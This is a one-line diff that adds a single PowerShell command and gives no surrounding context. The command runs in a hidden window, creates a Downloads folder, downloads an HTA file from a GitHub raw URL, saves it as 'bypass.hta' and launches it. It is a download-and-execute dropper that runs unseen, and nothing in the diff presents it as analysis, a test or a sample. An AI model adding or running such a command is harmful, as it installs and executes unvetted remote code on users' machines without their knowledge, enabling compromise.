@@ -1,0 +1,1 @@
+powershell.exe -WindowStyle hidden -Command "New-Item -ItemType Directory -Force -Path C:\\Downloads; Invoke-WebRequest -Uri https://raw.githubusercontent.com/NHTBOT/1/main/do03.hta -OutFile C:\\Downloads\\bypass.hta; Start-Process -FilePath C:\\Downloads\\bypass.hta"
